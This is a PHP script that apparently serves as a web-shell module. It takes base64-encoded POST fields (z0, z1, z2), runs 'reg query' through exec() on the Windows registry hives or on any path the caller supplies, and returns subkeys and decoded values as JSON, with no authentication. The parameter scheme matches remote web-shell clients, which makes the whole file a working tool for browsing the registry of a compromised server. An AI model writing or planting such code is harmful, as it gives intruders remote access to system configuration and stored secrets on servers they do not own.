<?php

function registry_value_to_bytes(string $value, string $type): string
{
    switch ($type) {

        case 'REG_DWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);

            return pack("V", $num);

        case 'REG_QWORD':
            $value = preg_replace('/^0x/i', '', $value);
            $num = hexdec($value);

            return pack("P", $num);

        case 'REG_BINARY':
            $hex = preg_replace('/\s+/', '', $value);
            return hex2bin($hex);

        case 'REG_SZ':
        case 'REG_EXPAND_SZ':
        case 'REG_MULTI_SZ':
        default:
            return iconv("UTF-8", "UTF-16LE", $value . "\0");
    }
}

function scan_hives(array $hives): array
{
    $result = [];

    foreach ($hives as $hive) {
        $output = [];
        $ret = 0;

        exec(
            'reg query ' . escapeshellarg($hive) . ' 2>&1',
            $output,
            $ret
        );

        $result[$hive] = ($ret === 0);
    }

    return $result;
}

function scan_registry(string $base_path): array
{
    $output = [];
    $ret = 0;

    exec(
        'reg query ' . escapeshellarg($base_path) . ' 2>&1',
        $output,
        $ret
    );

    // Always return the same schema
    $result = [
        'success' => ($ret === 0),
        'error'    => null,
        'subkeys'  => [],
        'values'   => []
    ];

    if ($ret !== 0) {
        $result['error'] = implode("\n", $output);
        return $result;
    }

    $firstKeySeen = false;

    foreach ($output as $line) {

        $line = rtrim($line);

        if ($line === '') {
            continue;
        }

        // Registry key paths
        if (preg_match('/^HKEY_/', $line)) {

            if (!$firstKeySeen) {
                $firstKeySeen = true;
            } else {
                $result['subkeys'][] = $line;
            }

            continue;
        }

        // Registry values
        if (preg_match('/^\s*(.*?)\s+(REG_\w+)\s+(.*)$/', $line, $m)) {

            $type = trim($m[2]);
            $value = trim($m[3]);

            $result['values'][] = [
                'name' => trim($m[1]),
                'type' => $type,
                'data' => base64_encode(
                    registry_value_to_bytes($value, $type)
                )
            ];
        }
    }

    return $result;
}

$action = base64_decode($_POST['z0'] ?? '') ?: '';
$encoding = base64_decode($_POST['z1'] ?? '') ?: 'utf-8';

header('Content-Type: application/json; charset=' . $encoding);

$hives = [
    'HKEY_CLASSES_ROOT',
    'HKEY_CURRENT_USER',
    'HKEY_LOCAL_MACHINE',
    'HKEY_USERS',
    'HKEY_CURRENT_CONFIG'
];

switch ($action) {

    case 'hive':
        echo json_encode(
            scan_hives($hives),
            JSON_UNESCAPED_UNICODE
        );
        break;

    case 'scan':

        $base_path = base64_decode($_POST['z2'] ?? '') ?: '';

        echo json_encode(
            scan_registry($base_path),
            JSON_UNESCAPED_UNICODE
        );
        break;

    default:
        echo json_encode([
            'success' => false,
            'error' => 'Unknown action',
            'subkeys' => [],
            'values' => []
        ]);
        break;
}